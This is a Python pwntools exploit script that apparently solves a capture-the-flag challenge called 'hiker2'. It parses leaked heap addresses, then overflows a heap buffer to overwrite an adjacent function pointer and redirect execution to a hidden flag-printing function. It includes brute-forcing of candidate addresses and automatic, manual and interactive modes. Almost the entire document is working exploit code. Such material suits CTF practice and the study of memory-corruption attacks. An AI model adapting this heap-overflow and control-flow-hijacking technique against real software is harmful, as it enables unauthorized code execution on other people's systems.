#!/usr/bin/env python3
"""
Hiker2 Heap Exploitation
The binary allocates heap memory and shows addresses of 'data' and 'fp' (function pointer)
We need to overflow 'data' to overwrite 'fp' and redirect execution
"""
from pwn import *

context.binary = elf = ELF('./hiker2')
context.log_level = 'info'

def find_target_function():
    """
    Disassemble the binary to find the hidden function that prints the flag
    """
    log.info("Searching for target function...")
    
    # Let's try to find it by looking at the binary
    with open('./hiker2', 'rb') as f:
        data = f.read()
        
        # Look for common strings that might indicate the win function
        if b'flag{' in data:
            offset = data.find(b'flag{')
            log.success(f"Found 'flag{{' string at offset: {hex(offset)}")
        
        if b'passed' in data or b'success' in data or b'correct' in data:
            log.info("Found success indicators in binary")
    
    # Use objdump to find functions
    try:
        import subprocess
        result = subprocess.check_output(['objdump', '-d', './hiker2'], text=True)
        
        # Find all function addresses
        functions = []
        for line in result.split('\n'):
            if '<' in line and '>:' in line:
                addr_str = line.split()[0]
                func_name = line.split('<')[1].split('>')[0]
                try:
                    addr = int(addr_str, 16)
                    if 0x08048000 < addr < 0x08050000:
                        functions.append((addr, func_name))
                        log.info(f"Found function: {func_name} @ {hex(addr)}")
                except:
                    pass
        
        # Return addresses to try (excluding common ones like main, plt entries)
        possible_targets = [addr for addr, name in functions 
                          if name not in ['main', '_start', '__libc_start_main', 
                                         'frame_dummy', 'register_tm_clones']]
        
        return possible_targets
        
    except:
        log.warning("objdump failed, using default addresses")
        # Brute force range around typical function locations
        possible_targets = []
        for addr in range(0x08049160, 0x08049250, 1):
            possible_targets.append(addr)
        return possible_targets

def exploit():
    """Main exploitation"""
    
    # Step 1: Run once to get addresses
    log.info("Step 1: Getting heap addresses...")
    p = process(['./hiker2', 'AAAA'])
    
    output = p.recvline().decode()
    log.info(output)
    
    # Parse addresses: "data is at 0xXXXXXXXX, fp is at 0xXXXXXXXX"
    parts = output.split(',')
    data_addr = int(parts[0].split('0x')[1], 16)
    fp_addr = int(parts[1].split('0x')[1], 16)
    
    log.success(f"data at: {hex(data_addr)}")
    log.success(f"fp at:   {hex(fp_addr)}")
    
    # Calculate distance between data and fp
    distance = fp_addr - data_addr
    log.info(f"Distance between data and fp: {distance} bytes ({hex(distance)})")
    
    p.close()
    
    # Step 2: Find target function using objdump or gdb
    log.info("\nStep 2: Finding target function...")
    log.info("Run these commands to find the win function:")
    log.info("  objdump -d hiker2 | grep -A 20 '<main>'")
    log.info("  objdump -d hiker2 | less")
    log.info("  gdb hiker2")
    log.info("    (gdb) info functions")
    log.info("    (gdb) disassemble main")
    
    # Step 3: Try common target addresses
    possible_targets = find_target_function()
    
    log.info("\nStep 3: Trying possible target addresses...")
    
    for target in possible_targets:
        log.info(f"\nTrying target address: {hex(target)}")
        
        # Build payload: padding + target address
        payload = b'A' * distance
        payload += p32(target)  # Overwrite fp with target address
        
        log.info(f"Payload length: {len(payload)} bytes")
        
        try:
            p = process(['./hiker2', payload])
            output = p.recvall(timeout=2).decode()
            
            if 'flag{' in output:
                log.success(f"FLAG FOUND with target {hex(target)}!")
                log.success(f"Output:\n{output}")
                return output
            else:
                log.info(f"Output: {output[:100]}")
                
        except Exception as e:
            log.warning(f"Crash or error: {e}")
        
        p.close()
    
    # Step 4: Manual mode - let user specify address
    log.info("\n" + "="*60)
    log.info("Automatic search complete. Manual override available.")
    log.info("="*60)
    
    return None

def manual_exploit(target_addr, data_fp_distance=80):
    """
    Manual exploitation with specific target address
    Usage: manual_exploit(0x080491c2, 80)
    """
    log.info(f"Building payload with target: {hex(target_addr)}")
    
    payload = b'A' * data_fp_distance
    payload += p32(target_addr)
    
    log.info(f"Payload: {payload.hex()}")
    
    p = process(['./hiker2', payload])
    output = p.recvall(timeout=2).decode()
    
    log.info(f"Output:\n{output}")
    
    if 'flag{' in output:
        log.success("FLAG CAPTURED!")
        return output
    
    return None

def interactive_mode():
    """Interactive exploitation helper"""
    print("\n" + "="*60)
    print("HIKER2 INTERACTIVE EXPLOITATION")
    print("="*60)
    
    print("\n[1] First, let's get the heap layout:")
    p = process(['./hiker2', 'TEST'])
    output = p.recvline().decode()
    print(f"    {output}")
    p.close()
    
    parts = output.split(',')
    data_addr = int(parts[0].split('0x')[1], 16)
    fp_addr = int(parts[1].split('0x')[1], 16)
    distance = fp_addr - data_addr
    
    print(f"\n[2] Memory layout:")
    print(f"    data:     {hex(data_addr)}")
    print(f"    fp:       {hex(fp_addr)}")
    print(f"    distance: {distance} bytes")
    
    print(f"\n[3] Find the target function address:")
    print(f"    Run: objdump -d hiker2 | less")
    print(f"    Look for a function that calls printf with 'flag' or similar")
    print(f"    Or run: gdb hiker2")
    print(f"           (gdb) disassemble main")
    print(f"           Look for call instructions to suspicious functions")
    
    target = input(f"\n[4] Enter target function address (e.g., 0x080491c2): ")
    target_addr = int(target, 16)
    
    print(f"\n[5] Building payload...")
    payload = b'A' * distance + p32(target_addr)
    
    print(f"    Payload length: {len(payload)} bytes")
    print(f"    Payload (hex): {payload.hex()}")
    
    print(f"\n[6] Executing exploit...")
    p = process(['./hiker2', payload])
    output = p.recvall(timeout=2).decode()
    
    print(f"\n[7] Output:")
    print(output)
    
    if 'flag{' in output:
        print("\n" + "="*60)
        print("SUCCESS! FLAG CAPTURED!")
        print("="*60)

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) > 1:
        if sys.argv[1] == 'interactive':
            interactive_mode()
        elif sys.argv[1] == 'manual':
            if len(sys.argv) >= 3:
                target = int(sys.argv[2], 16)
                distance = int(sys.argv[3]) if len(sys.argv) > 3 else 80
                manual_exploit(target, distance)
            else:
                print("Usage: python hiker2_exploit.py manual 0x080491c2 80")
    else:
        # Run automatic exploitation
        result = exploit()
        if not result:
            print("\nAutomatic exploitation failed.")
            print("Run: python hiker2_exploit.py interactive")